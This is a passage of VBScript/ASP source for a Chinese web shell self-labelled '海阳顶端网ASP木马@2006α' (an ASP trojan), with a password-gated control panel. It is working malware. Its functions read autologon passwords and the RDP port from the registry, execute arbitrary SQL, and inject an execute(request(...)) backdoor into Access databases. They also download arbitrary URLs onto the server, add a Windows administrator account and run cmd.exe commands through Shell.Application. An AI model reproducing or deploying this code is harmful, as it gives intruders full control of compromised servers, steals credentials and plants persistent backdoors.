		strExEnvList = "SystemRoot$WinDir$ComSpec$TEMP$TMP$NUMBER_OF_PROCESSORS$OS$Os2LibPath$Path$PATHEXT$PROCESSOR_ARCHITECTURE$" & _
					   "PROCESSOR_IDENTIFIER$PROCESSOR_LEVEL$PROCESSOR_REVISION"
		aryExEnvList = Split(strExEnvList, "$")
		
		Set objWshSysEnv = ws.Environment("SYSTEM")
		chkErr(Err)

		intCpuNum = Request.ServerVariables("NUMBER_OF_PROCESSORS")
		If IsNull(intCpuNum) Or intCpuNum = "" Then
			intCpuNum = objWshSysEnv("NUMBER_OF_PROCESSORS")
		End If
		strOS = Request.ServerVariables("OS")
		If IsNull(strOS) Or strOS = "" Then
			strOS = objWshSysEnv("OS")
			strOs = strOs & "(有可能是 Windows2003 哦)"
		End If
		strCpuInfo = objWshSysEnv("PROCESSOR_IDENTIFIER")

		echo "<a href=javascript:showHideMe(srvInf);>服务器相关参数:</a>"
		echo "<ol id=srvInf><hr/>"
		echo "<li>服务器名: " & Request.ServerVariables("SERVER_NAME") & "</li>"
		echo "<li>服务器IP: " & Request.ServerVariables("LOCAL_ADDR") & "</li>"
		echo "<li>服务端口: " & Request.ServerVariables("SERVER_PORT") & "</li>"
		echo "<li>服务器内存: " & getTheSize(sa.GetSystemInformation("PhysicalMemoryInstalled")) & "</li>"
		echo "<li>服务器时间: " & Now & "</li>"
		echo "<li>服务器软件: " & Request.ServerVariables("SERVER_SOFTWARE") & "</li>"
		echo "<li>脚本超时时间: " & Server.ScriptTimeout & "</li>"
		echo "<li>服务器CPU数量: " & intCpuNum & "</li>"
		echo "<li>服务器CPU详情: " & strCpuInfo & "</li>"
		echo "<li>服务器操作系统: " & strOS & "</li>"
		echo "<li>服务器解译引擎: " & ScriptEngine & "/" & ScriptEngineMajorVersion & "." & ScriptEngineMinorVersion & "." & ScriptEngineBuildVersion & "</li>"
		echo "<li>本文件实际路径: " & Request.ServerVariables("PATH_TRANSLATED") & "</li>"
		echo "<hr/></ol>"
		
		echo "<br/><a href=javascript:showHideMe(srvEnvInf);>服务器相关参数:</a>"
		echo "<ol id=srvEnvInf><hr/>"
		For i = 0 To UBound(aryExEnvList)
			echo "<li>" & aryExEnvList(i) & ": " & ws.ExpandEnvironmentStrings("%" & aryExEnvList(i) & "%") & "</li>"
		Next
		echo "<hr/></ol>"
		
		Set sa = Nothing
		Set objWshSysEnv = Nothing
	End Sub

	Sub getSrvDrvInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim objTheDrive
		echo "<br/><a href=javascript:showHideMe(srvDriveInf);>服务器磁盘信息:</a>"
		echo "<ol id=srvDriveInf><hr/>"
		echo "<div id='fsoDriveList'>"
		echo "<span>盘符</span><span>类型</span><span>卷标</span><span>文件系统</span><span>可用空间</span><span>总空间</span><br/>"
		For Each objTheDrive In fso.Drives
			echo "<span>" & objTheDrive.DriveLetter & "</span>"
			echo "<span>" & getDriveType(objTheDrive.DriveType) & "</span>"
			If UCase(objTheDrive.DriveLetter) = "A" Then
				echo "<br/>"
			 Else
				echo "<span>" & objTheDrive.VolumeName & "</span>"
				echo "<span>" & objTheDrive.FileSystem & "</span>"
				echo "<span>" & getTheSize(objTheDrive.FreeSpace) & "</span>"
				echo "<span>" & getTheSize(objTheDrive.TotalSize) & "</span><br/>"
			End If
			If Err Then
				Err.Clear
				echo "<br/>"
			End If
		Next
		echo "</div><hr/></ol>"
		Set objTheDrive = Nothing
	End Sub
	
	Sub getSiteRootInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim objTheFolder
		Set objTheFolder = fso.GetFolder(Server.MapPath("/"))
		echo "<br/><a href=javascript:showHideMe(siteRootInfo);>站点根目录信息:</a>"
		echo "<ol id=siteRootInfo><hr/>"
		echo "<li>物理路径: " & Server.MapPath("/") & "</li>"
		echo "<li>当前大小: " & getTheSize(objTheFolder.Size) & "</li>"
		echo "<li>文件数: " & objTheFolder.Files.Count & "</li>"
		echo "<li>文件夹数: " & objTheFolder.SubFolders.Count & "</li>"
		echo "<li>创建日期: " & objTheFolder.DateCreated & "</li>"
		echo "<li>最后访问日期: " & objTheFolder.DateLastAccessed & "</li>"
		echo "</ol>"
	End Sub
	
	Sub getTerminalInfo()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim terminalPortPath, terminalPortKey, termPort
		Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
		Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword

		terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
		terminalPortKey = "PortNumber"
		termPort = ws.RegRead(terminalPortPath & terminalPortKey)

		echo "终端服务端口及自动登录信息<hr/><ol>"
		If termPort = "" Or Err.Number <> 0 Then 
			echo  "无法得到终端服务端口, 请检查权限是否已经受到限制.<br/>"
		 Else
			echo  "当前终端服务端口: " & termPort & "<br/>"
		End If
		
		autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
		autoLoginEnableKey = "AutoAdminLogon"
		autoLoginUserKey = "DefaultUserName"
		autoLoginPassKey = "DefaultPassword"
		isAutoLoginEnable = ws.RegRead(autoLoginPath & autoLoginEnableKey)
		If isAutoLoginEnable = 0 Then
			echo  "系统自动登录功能未开启<br/>"
		Else
			autoLoginUsername = ws.RegRead(autoLoginPath & autoLoginUserKey)
			echo  "自动登录的系统帐户: " & autoLoginUsername & "<br>"
			autoLoginPassword = ws.RegRead(autoLoginPath & autoLoginPassKey)
			If Err Then
				Err.Clear
				echo  "False"
			End If
			echo  "自动登录的帐户密码: " & autoLoginPassword & "<br>"
		End If
		echo "</ol>"
	End Sub

	Sub PageLogin()
		Dim theAct, passWord
		theAct = Request("theAct")
		passWord = Request("userPassword")
		
		showTitle("管理登录")
		
		If theAct = "chkLogin" Then
			If passWord = userPassword Then
				Session(m & "userPassword") = passWord
				redirectTo("?pageName=PageList")
			 Else
				echo "<script language=javascript>alert('啊哦,登录失败了...');history.back();</script>"
			End If
		End If
		
		echo "<style>body{margin:8;text-align:center;}</style>"
		echo "海阳顶端网ASP木马@2006α<hr/>"
		echo "<body onload=document.forms[0].userPassword.focus();>"
		echo "<form method=post onsubmit=this.Submit.disabled=true;>"
		echo "<input name=userPassword class=input type=password size=30> "
		echo "<input type=hidden name=theAct value=chkLogin>"
		echo "<input type=submit name=Submit value=""" & HtmlEncode(myName) & """ class=input>"
		echo "<hr/>"
		echo "本版感谢: Kevin,注册表各键值的收集工作"
		echo "<br/>WWW.HAIYANGTOP.NET,WWW.HIDIDI.NET 2005.02"
		echo "</form>"
		echo "<body>"
	End Sub

	Sub pageMsDataBase()
		Dim theAct, sqlStr
		theAct = Request("theAct")
		sqlStr = Request("sqlStr")
		
		showTitle("mdb+mssql数据库操作页")
		
		If sqlStr = "" Then
			If Session(m & "sqlStr") = "" Then
				sqlStr = "e:\hytop.mdb或sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;"
			 Else
				sqlStr = Session(m & "sqlStr")
			End If
		End If
		Session(m & "sqlStr") = sqlStr
		
		echo "<style>body{margin:8;}</style>"
		echo "<form method=post action='?pageName=MsDataBase&theAct=showTables' onSubmit='this.Submit.disabled=true;'>"
		echo "<a href='?pageName=MsDataBase'>mdb+mssql数据库操作</a><br/>"
		echo "<input name=sqlStr type=text id=sqlStr value=""" & sqlStr & """ size=60 style='width:80%;'>"
		echo "<input name=theAct type=hidden value=showTables><br/>"
		echo "<input type=Submit name=Submit value=' 提交 '>"
		echo "<input type=button name=Submit2 value=' 插入 ' onclick=""if(confirm('这里是在ACESS数据里插入海阳顶端网ASP后门\n默认密码是" & clientPassword & "\n后门插入后可以使用的前提是\n数据库是asp后缀, 并且没有错乱asp代码\n确认操作吗?')){location.href='?pageName=MsDataBase&theAct=inject&sqlStr='+this.form.sqlStr.value;this.disabled=true;}"">"
		echo "<input type=button value=' 示例 ' onclick=""this.form.sqlStr.value='e:\\HYTop.mdb或sql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;';"">"
		echo "</form>"
		echo "<hr/>注: 插入只针对ACCESS操作, 要浏览ACCESS在表单中的写法是""d:\bbs.mdb"", SQL据库写法是""sql:连接字符串"", 不要忘写sql:。<hr/>"

		Select Case theAct
			Case "showTables"
				showTables()
			Case "query"
				showQuery()
			Case "inject"
				accessInject()
		End Select
		
		echo "Powered By Marcos 2005.02"
	End Sub
	
	Sub showTables()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim conn, sqlStr, rsTable, rsColumn, connStr, tablesStr
		sqlStr = Request("sqlStr")
		If LCase(Left(sqlStr, 4)) = "sql:" Then
			connStr = Mid(sqlStr, 5)
		 Else
			connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
		End If
		Set conn = Server.CreateObject("Adodb.Connection")
		
		conn.Open connStr
		chkErr(Err)
		
		tablesStr = getTableList(conn, sqlStr, rsTable)
		
		echo "<a href=""?pageName=MsDataBase&theAct=showTables&sqlStr=" & UrlEncode(sqlStr)  & """>数据库表结构查看:</a><br/>"
		echo tablesStr & "<hr/>"
		echo "<a href=""?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & """>转到SQL命令执行</a><hr/>"

		Do Until rsTable.Eof
			Set rsColumn = conn.OpenSchema(4, Array(Empty, Empty, rsTable("Table_Name").value))
			echo "<table border=0 cellpadding=0 cellspacing=0><tr><td height=22 colspan=6><b>" & rsTable("Table_Name") & "</b></td>"
			echo "</tr><tr><td colspan=6><hr/></td></tr><tr align=center>"
			echo "<td>字段名</td><td>类型</td><td>大小</td><td>精度</td><td>允许为空</td><td>默认值</td></tr>"
			echo "<tr><td colspan=6><hr/></td></tr>"

			Do Until rsColumn.Eof
				echo "<tr align=center>"
				echo "<td align=Left>&nbsp;" & rsColumn("Column_Name") & "</td>"
				echo "<td width=80>" & getDataType(rsColumn("Data_Type")) & "</td>"
				echo "<td width=70>" & rsColumn("Character_Maximum_Length") & "</td>"
				echo "<td width=70>" & rsColumn("Numeric_Precision") & "</td>"
				echo "<td width=70>" & rsColumn("Is_Nullable") & "</td>"
				echo "<td width=80>" & rsColumn("Column_Default") & "</td>"
				echo "</tr>"
				rsColumn.MoveNext
			Loop
			
			echo "<tr><td colspan=6><hr/></td></tr></table>"
			rsTable.MoveNext
		Loop

		echo "<hr/>"

		conn.Close
		Set conn = Nothing
		Set rsTable = Nothing
		Set rsColumn = Nothing
	End Sub
	
	Sub showQuery()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim i, j, rs, sql, page, conn, sqlStr, connStr, rsTable, tablesStr, theTable
		sql = Request("sql")
		page = Request("page")
		sqlStr = Request("sqlStr")
		theTable = Request("theTable")
		
		If Not IsNumeric(page) or page = "" Then
			page = 1
		End If
		
		If sql = "" And theTable <> "" Then
			sql = "Select top 10 * from [" & theTable & "]"
		End If
		
		If LCase(Left(sqlStr, 4)) = "sql:" Then
			connStr = Mid(sqlStr, 5)
		 Else
			connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
		End If
		Set rs = Server.CreateObject("Adodb.RecordSet")
		Set conn = Server.CreateObject("Adodb.Connection")
	
		conn.Open connStr
		chkErr(Err)
		
		tablesStr = getTableList(conn, sqlStr, rsTable)

		echo "<a href=""?pageName=MsDataBase&theAct=showTables&sqlStr=" & UrlEncode(sqlStr)  & """>数据库表结构查看:</a><br/>"
		echo tablesStr & "<hr/>"
		echo "<a href=?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&sql=" & UrlEncode(sql) & ">SQL命令执行及查看</a>"
		echo "<br/><form method=post action=""?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & """>"
		echo "<input name=sql type=text id=sql value=""" & HtmlEncode(sql) & """ size=60>"
		echo "<input type=Submit name=Submit4 value=执行查询><hr/>"

		If sql <> "" And Left(LCase(sql), 7) = "select " Then
			rs.Open sql, conn, 1, 1
			chkErr(Err)
			rs.PageSize = 20
			If Not rs.Eof Then
				rs.AbsolutePage = page
			End If
			If rs.Fields.Count>0 Then
				echo "<br><table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""98%"">"
				echo "<tr>"
				echo "<td height=""22"" align=""center"" class=""tr"" colspan=""" & rs.Fields.Count & """>SQL操作 - 执行结果</td>"
				echo "</tr>"
				echo "<tr>"
				For j = 0 To rs.Fields.Count-1
					echo "<td height=""22"" align=""center"" class=""td""> " & rs.Fields(j).Name & " </td>"
				Next
				For i = 1 To 20
					If rs.Eof Then
						Exit For
					End If
					echo "</tr>"
					echo "<tr valign=top>"
					For j = 0 To rs.Fields.Count-1
						echo "<td height=""22"" align=""center"">" & HtmlEncode(fixNull(rs(j))) & "</td>"
					Next
					echo "</tr>"
					rs.MoveNext
				Next
			End If
			echo "<tr>"
			echo "<td height=""22"" align=""center"" class=""td"" colspan=""" & rs.Fields.Count & """>"
			For i = 1 To rs.PageCount
				echo Replace("<a href=""?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&sql=" & UrlEncode(sql) & "&page=" & i & """><font {$font" & i & "}>" & i & "</font></a> ", "{$font" & page & "}", "class=warningColor")
			Next
			echo "</td></tr></table>"
			rs.Close
		 Else
		 	If sql <> "" Then
				conn.Execute(sql)
				chkErr(Err)
				echo "<center><br>执行完毕!</center>"
			End If
		End If

		echo "</form><hr/>"

		conn.Close
		Set rs = Nothing
		Set conn = Nothing
		Set rsTable = Nothing
	End Sub
	
	Function getDataType(typeId)
		Select Case typeId
			Case 130
				getDataType = "文本"
			Case 2
				getDataType = "整型"
			Case 3
				getDataType = "长整型"
			Case 7
				getDataType = "日期/时间"
			Case 5
				getDataType = "双精度型"
			Case 11
				getDataType = "是/否"
			Case 128
				getDataType = "OLE 对象"
			Case Else
				getDataType = typeId
		End Select
	End Function
	
	Sub accessInject()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim rs, conn, sqlStr, connStr
		sqlStr = Request("sqlStr")
		If LCase(Left(sqlStr, 4)) = "sql:" Then
			showErr("插入只对ACCESS数据库有效!")
		 Else
			connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
		End If
		Set rs = Server.CreateObject("Adodb.RecordSet")
		Set conn = Server.CreateObject("Adodb.Connection")

		conn.Open connStr
		chkErr(Err)

		If notdownloadsExists = True Then
			conn.Execute("drop table notdownloads")
		End If

		conn.Execute("create table notdownloads(notdownloads oleobject)")

		rs.Open "notdownloads", conn, 1, 3
		rs.AddNew
		rs("notdownloads").AppendChunk(ChrB(Asc("<")) & ChrB(Asc("%")) & ChrB(Asc("e")) & ChrB(Asc("x")) & ChrB(Asc("e")) & ChrB(Asc("c")) & ChrB(Asc("u")) & ChrB(Asc("t")) & ChrB(Asc("e")) & ChrB(Asc("(")) & ChrB(Asc("r")) & ChrB(Asc("e")) & ChrB(Asc("q")) & ChrB(Asc("u")) & ChrB(Asc("e")) & ChrB(Asc("s")) & ChrB(Asc("t")) & ChrB(Asc("(")) & ChrB(Asc("""")) & ChrB(Asc(clientPassword)) & ChrB(Asc("""")) & ChrB(Asc(")")) & ChrB(Asc(")")) & ChrB(Asc("%")) & ChrB(Asc(">")) & ChrB(Asc(" ")))
	    rs.Update
    	rs.Close
		
		echo "<script language=""javascript"">alert('插入成功!');history.back();</script>"
		
		conn.Close
		Set rs = Nothing
		Set conn = Nothing
	End Sub
	
	Function getTableList(conn, sqlStr, rsTable)
		Set rsTable = conn.OpenSchema(20, Array(Empty, Empty, Empty, "table"))

		Do Until rsTable.Eof
			getTableList = getTableList & "<a href=""?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&theTable=" & UrlEncode(rsTable("Table_Name")) & """>[" & rsTable("Table_Name") & "]</a>&nbsp;"
			rsTable.MoveNext
		Loop
		rsTable.MoveFirst
	End Function

	Sub PageObjOnSrv()
		Dim i, objTmp, txtObjInfo, strObjectList, strDscList
		txtObjInfo = Trim(Request("txtObjInfo"))

		strObjectList = "MSWC.AdRotator,MSWC.BrowserType,MSWC.NextLink,MSWC.Tools,MSWC.Status,MSWC.Counters,IISSample.ContentRotator," & _
						"IISSample.PageCounter,MSWC.PermissionChecker,Adodb.Connection,SoftArtisans.FileUp,SoftArtisans.FileManager,LyfUpload.UploadFile," & _
						"Persits.Upload.1,W3.Upload,JMail.SmtpMail,CDONTS.NewMail,Persits.MailSender,SMTPsvg.Mailer,DkQmail.Qmail,Geocel.Mailer," & _
						"IISmail.Iismail.1,SmtpMail.SmtpMail.1,SoftArtisans.ImageGen,W3Image.Image," & _
						"Scripting.FileSystemObject,Adodb.Stream,Shell.Application,WScript.Shell,Wscript.Network"
		strDscList = "广告轮换,浏览器信息,内容链接库,,,计数器,内容轮显,,权限检测,ADO 数据对象,SA-FileUp 文件上传,SoftArtisans 文件管理," & _
					 "刘云峰的文件上传组件,ASPUpload 文件上传,Dimac 文件上传,Dimac JMail 邮件收发,虚拟 SMTP 发信,ASPemail 发信,ASPmail 发信,dkQmail 发信," & _
					 "Geocel 发信,IISmail 发信,SmtpMail 发信,SA 的图像读写,Dimac 的图像读写组件," & _
					 "FSO,Stream 流,,,"

		aryObjectList = Split(strObjectList, ",")
		aryDscList = Split(strDscList, ",")

		showTitle("服务器组件支持情况检测")

		echo "其他组件支持情况检测<br/>"
		echo "在下面的输入框中输入你要检测的组件的ProgId或ClassId。<br/>"
		echo "<form method=post>"
		echo "<input name=txtObjInfo size=30 value=""" & txtObjInfo & """><input name=theAct type=submit value=我要检测>"
		echo "</form>"

		If Request("theAct") = "我要检测" And txtObjInfo <> "" Then
			Call getObjInfo(txtObjInfo, "")
		End If
		
		echo "<hr/>"
		echo "<lu>组件名称 ┆ 支持及其它"

		For i = 0 To UBound(aryDscList)
			Call getObjInfo(aryObjectList(i), aryDscList(i))
		Next

		echo "</lu><hr/>Powered By Marcos 2005.02"		
	End Sub
	
	Sub getObjInfo(strObjInfo, strDscInfo)
		Dim objTmp

		If isDebugMode = False Then
			On Error Resume Next
		End If

		echo "<li> " & strObjInfo
		If strDscInfo <> "" Then
			echo " (" & strDscInfo & "组件)"
		End If

		echo " ┆ "

		Set objTmp = Server.CreateObject(strObjInfo)
		If Err <> -2147221005 Then
			echo "√ "
			echo "Version: " & objTmp.Version & "; "
			echo "About: " & objTmp.About
		 Else
			echo "×"
		End If
		echo "</li>"

		If Err Then
			Err.Clear
		End If
		
		Set objTmp = Nothing
	End Sub

	Sub PageOtherTools()
		Dim theAct
		theAct = Request("theAct")

		showTitle("一些零碎的小东西")

		Select Case theAct
			Case "downFromUrl"
				downFromUrl()
				Response.End
			Case "addUser"
				AddUser Request("userName"), Request("passWord")
				Response.End
			Case "readReg"
				readReg()
				Response.End
		End Select

		echo "数制转换:<hr/>"
		echo "<input name=text1 value=字符和数字转10和16进制 size=25 id=text9>"
		echo "<input type=button onclick=main(); value=给我转>"
		echo "<input value=16进制转10进制和字符 size=25 id=vars>"
		echo "<input type=button onClick=main2(); value=给我转>"
		echo "<hr/>"
		
		echo "下载到服务器:<hr/>"
		echo "<form method=post target=_blank>"
		echo "<input name=theUrl value='http://' size=80><input type=submit value=' 下载 '><br/>"
		echo "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
		echo "<input type=checkbox name=overWrite value=2>存在覆盖"
		echo "<input type=hidden value=downFromUrl name=theAct>"
		echo "</form>"
		echo "<hr/>"
		
		echo "文件编辑:<hr/>"
		echo "<form method=post action='?' target=_blank>"
		echo "<input size=80 name=thePath value=""" & HtmlEncode(Request.ServerVariables("PATH_TRANSLATED")) & """>"
		echo "<input type=hidden value=showEdit name=theAct>"
		echo "<select name=pageName><option value=AppFileExplorer>用Stream</option><option value=FsoFileExplorer>用FSO</option></select>"
		echo "<input type=submit value=' 打开 '>"
		echo "</form><hr/>"
		
		echo "管理帐号添加(成功率极低):<hr/>"
		echo "<form method=post target=_blank>"
		echo "<input type=hidden value=addUser name=theAct>"
		echo "<input name=userName value='HYTop' size=39>"
		echo "<input name=passWord type=password value='HYTop' size=39>"
		echo "<input type=submit value=' 添加 '>"
		echo "</form><hr/>"
		
		echo "注册表键值读取(<a href=javascript:showHideMe(regeditInfo);>资料</a>):<hr/>"
		echo "<form method=post target=_blank>"
		echo "<input type=hidden value=readReg name=theAct>"
		echo "<input name=thePath value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName' size=80>"
		echo "<input type=submit value=' 读取 '>"
		echo "<span id=regeditInfo style='display:none;'><hr/>"
		echo "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\Dont-DisplayLastUserName,REG_SZ,1 {不显示上次登录用户}<br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\restrictanonymous,REG_DWORD,0 {0=缺省,1=匿名用户无法列举本机用户列表,2=匿名用户无法连接本机IPC$共享}<br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer,REG_DWORD,0 {禁止默认共享}<br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters\EnableSharedNetDrives,REG_SZ,0 {关闭网络共享}<br/>"
		echo "HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters,REG_DWORD,1 {启用TCP/IP筛选(所有试配器)}<br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\IPEnableRouter,REG_DWORD,1 {允许IP路由}<br/>"
		echo "-------以下似乎要看绑定的网卡,不知道是否准确---------<br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\DefaultGateway,REG_MUTI_SZ {默认网关}<br/>"
		echo "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\NameServer {首DNS}<br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts {允许的TCP/IP端口}<br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts {允许的UDP端口}<br/>"
		echo "-----------OVER--------------------<br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count {共几块活动网卡}<br/>"
		echo "HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind {当前网卡的序列(把上面的替换)}<br/>"
		echo "==========================================================<br/>以上资料由kEvin1986提供"
		echo "</span>"
		echo "</form><hr/>"
		
		echo "<script language=vbs>" & vbNewLine
		echo "sub main()" & vbNewLine
		echo "base=document.all.text9.value" & vbNewLine
		echo "If IsNumeric(base) Then" & vbNewLine
		echo "cc=hex(cstr(base))" & vbNewLine
		echo "alert(""10进制为""&base)" & vbNewLine
		echo "alert(""16进制为""&cc)" & vbNewLine
		echo "exit sub" & vbNewLine
		echo "end if" & vbNewLine
		echo "aa=asc(cstr(base))" & vbNewLine
		echo "bb=hex(aa)" & vbNewLine
		echo "alert(""10进制为""&aa)" & vbNewLine
		echo "alert(""16进制为""&bb)" & vbNewLine
		echo "end sub" & vbNewLine
		echo "sub main2()" & vbNewLine
		echo "If document.all.vars.value<>"""" Then" & vbNewLine
		echo "Dim nums,tmp,tmpstr,i" & vbNewLine
		echo "nums=document.all.vars.value" & vbNewLine
		echo "nums_len=Len(nums)" & vbNewLine
		echo "For i=1 To nums_len" & vbNewLine
		echo "tmp=Mid(nums,i,1)" & vbNewLine
		echo "If IsNumeric(tmp) Then" & vbNewLine
		echo "tmp=tmp * 16 * (16^(nums_len-i-1))" & vbNewLine
		echo "Else" & vbNewLine
		echo "If ASC(UCase(tmp))<65 Or ASC(UCase(tmp))>70 Then" & vbNewLine
		echo "alert(""你输入的数值中有非法字符，16进制数只包括1～9及a～f之间的字符，请重新输入。"")" & vbNewLine
		echo "exit sub" & vbNewLine
		echo "End If" & vbNewLine
		echo "tmp=(ASC(UCase(tmp))-55) * (16^(nums_len-i))" & vbNewLine
		echo "End If" & vbNewLine
		echo "tmpstr=tmpstr+tmp" & vbNewLine
		echo "Next" & vbNewLine
		echo "alert(""转换的10进制为:""&tmpstr&""其字符值为:""&chr(tmpstr))" & vbNewLine
		echo "End If" & vbNewLine
		echo "end sub" & vbNewLine
		echo "</script>" & vbNewLine

		echo "Powered By Marcos 2005.02"
	End Sub
	
	Sub downFromUrl()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim Http, theUrl, thePath, stream, fileName, overWrite
		theUrl = Request("theUrl")
		thePath = Request("thePath")
		overWrite = Request("overWrite")
		Set stream = Server.CreateObject("Adodb.Stream")
		Set Http = Server.CreateObject("MSXML2.XMLHTTP")
		
		If overWrite <> 2 Then
			overWrite = 1
		End If
		
		Http.Open "GET", theUrl, False
		Http.Send()
		If Http.ReadyState <> 4 Then 
			Exit Sub
		End If
		
		With stream
			.Type = 1
			.Mode = 3
			.Open
			.Write Http.ResponseBody
			.Position = 0
			.SaveToFile thePath, overWrite
			If Err.Number = 3004 Then
				Err.Clear
				fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
				If fileName = "" Then
					fileName = "index.htm.txt"
				End If
				thePath = thePath & "\" & fileName
				.SaveToFile thePath, overWrite
			End If
			.Close
		End With
		chkErr(Err)
		
		alertThenClose("文件 " & Replace(thePath, "\", "\\") & " 下载成功!")
		
		Set Http = Nothing
		Set Stream = Nothing
	End Sub
	
	Sub AddUser(strUser, strPassword)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim computer, theUser, theGroup
		Set computer = Getobject("WinNT://.")
		Set theGroup = GetObject("WinNT://./Administrators,group")
		
		Set theUser = computer.Create("User", strUser)
		theUser.SetPassword(strPassword)
		chkErr(Err)
		theUser.SetInfo
		chkErr(Err)
		theGroup.Add theUser
		chkErr(Err)
		
		Set theUser = Nothing
		Set computer = Nothing
		Set theGroup = Nothing
		
		echo getUserInfo(strUser)
	End Sub
	
	Sub readReg()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim i, thePath, theArray
		thePath = Request("thePath")
'		echo thePath & "<br/>"
		theArray = ws.RegRead(thePath)
		If IsArray(theArray) Then
			For i = 0 To UBound(theArray)
				echo "<li>" & theArray(i)
			Next
		 Else
			echo "<li>" & theArray
		End If
		chkErr(Err)
	End Sub

	Sub PageList()
		showTitle("功能模块列表")

		echo "<base target=_blank>"
		echo "海阳顶端网ASP木马@2006α<hr/>"
		echo "<ol><li><a href='?pageName=ServiceList'>系统服务信息</a></li>"
		echo "<br/>"
		echo "<li><a href='?pageName=infoAboutSrv'>服务器相关数据<br/>("
		echo "<a href='?pageName=infoAboutSrv&theAct=getSrvInfo'>系统参数</a>,"
		echo "<a href='?pageName=infoAboutSrv&theAct=getSrvDrvInfo'>系统磁盘</a>,"
		echo "<a href='?pageName=infoAboutSrv&theAct=getSiteRootInfo'>站点文件夹</a>,"
		echo "<a href='?pageName=infoAboutSrv&theAct=getTerminalInfo'>终端端口&自动登录)</a></li>"
		echo "<br/>"
		echo "<li><a href='?pageName=objOnSrv'>服务器组件探针</a></li>"
		echo "<br/>"
		echo "<li><a href='?pageName=userList'>系统用户及用户组信息</a></li>"
		echo "<br/>"
		echo "<li><a href='?pageName=CSInfo'>客户端服务器交互信息</a></li>"
		echo "<br/>"
		echo "<li><a href='?pageName=WsCmdRun'>WScript.Shell程序运行器</a></li>"
		echo "<br/>"
		echo "<li><a href='?pageName=SaCmdRun'>Shell.Application程序运行器</a></li>"
		echo "<br/>"
		echo "<li><a href='?pageName=FsoFileExplorer'>FSO文件浏览操作器</a></li>"
		echo "<br/>"
		echo "<li><a href='?pageName=AppFileExplorer'>Shell.Application文件浏览操作器</a></li>"
		echo "<br/>"
		echo "<li><a href='?pageName=MsDataBase'>微软数据库查看/操作器</a></li>"
		echo "<br/>"
		echo "<li><a href='?pageName=TxtSearcher'>文本文件搜索器</a></li>"
		echo "<br/>"
		echo "<li><a href='?pageName=OtherTools'>一些零碎的小东西</a></li>"
		echo "<br/></ol>"
		echo "<hr/>Powered By Marcos 2005.02"
	End Sub

	Sub PageSaCmdRun()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, thePath, theAct, appPath, appName, appArgs
		
		showTitle("Shell.Application命令行操作")
		
		theAct = Trim(Request("theAct"))
		appPath = Trim(Request("appPath"))
		thePath = Trim(Request("thePath"))
		appName = Trim(Request("appName"))
		appArgs = Trim(Request("appArgs"))

		If theAct = "doAct" Then
			If appName = "" Then
				appName = "cmd.exe"
			End If
		
			If appPath <> "" And Right(appPath, 1) <> "\" Then
				appPath = appPath & "\"
			End If
		
			If LCase(appName) = "cmd.exe" And appArgs <> "" Then
				If LCase(Left(appArgs, 2)) <> "/c" Then
					appArgs = "/c " & appArgs
				End If
			Else
				If LCase(appName) = "cmd.exe" And appArgs = "" Then
					appArgs = "/c "
				End If
			End If
			
			sa.ShellExecute appName, appArgs, appPath, "", 0
			chkErr(Err)
		End If
		
		If theAct = "readResult" Then
			Err.Clear
			echo encode(streamLoadFromFile(aspPath))
			If Err Then
				Set theFile = fso.OpenTextFile(aspPath)
				echo encode(theFile.ReadAll())
				Set theFile = Nothing
			End If
			Response.End
		End If
		
		echo "<style>body{margin:8;border:none;background-color:buttonface;}</style>"
